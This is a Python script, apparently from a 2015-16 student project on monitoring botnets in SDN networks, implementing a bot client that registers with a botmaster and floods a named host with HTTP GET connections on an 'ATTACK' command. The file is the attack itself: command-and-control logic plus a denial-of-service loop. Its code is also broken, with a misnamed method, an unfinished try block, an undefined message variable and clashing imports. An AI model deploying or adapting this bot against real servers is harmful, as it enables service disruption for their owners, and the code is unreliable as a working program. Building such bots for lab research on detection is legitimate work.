#!/usr/bin/python

## (c) Mehdi Mtimet and Geoffrey Boulanger
## PFE - Monitoring de botnets a travers des reseaux SDN
## 2015 - 2016

import time, os, sys, string, ntplib
from socket import *  #importing the socket library for network connections
from time import ctime,time

## Slave script to send information to his BotMaster and be ready to launch attack

SERVER_HOST = '10.0.0.2'
SERVER_PORT = 80
MS_LISTEN_HOST = '10.0.0.3'
MS_LISTEN_PORT = 80

class Slave():
    def __init__(self, host, port, sock=None):
        print("I am a slave, i am going to attack")
        self.host = host
        self.port = port

        ip = gethostbyname(self.host)
        self.num_connections = 0

        # get ntp times
		ntp_res=time()

        # connect to master
        self.masterHost = MS_LISTEN_HOST
        self.masterPort = MS_LISTEN_PORT
        self.sockMaster = socket(AF_INET, SOCK_STREAM)
        self.sockMaster.connect((self.masterHost, self.masterPort))
        self.sockMaster.send('{0}'.format(ctime(ntp_res)))

    def acceptMessages(self):
        msg_buf = self.sockMaster.recv(64)
        if len(msg_buf) > 0:
          print(msg_buf)
          if (msg_buf.startswith('ATTACK')):
              command, host, port, offtime = msg_buf.split()
              self.doTheDos(host, int(port))

    def doTheDoS(self, host, port):
        for _ in range(0, 50):
          self.attackDoS(host, port)

    def attackDoS(self, host, port):
        try:
            self.attack = socket(AF_INET, SOCK_STREAM)
            self.attack.connect((host, port))
            self.attack.send("GET /%s HTTP/1.1\r\n" % self.message)
	    print ("The attack is beggining")
	    data = self.attack.recv(1024)
            
        #attack.close()

if __name__ == '__main__':
  slaveNode = Slave('localhost', 8080)

  while(1):
#for i in xrange(conn):
    #slaveNode.attackDoS()
    slaveNode.acceptMessages()
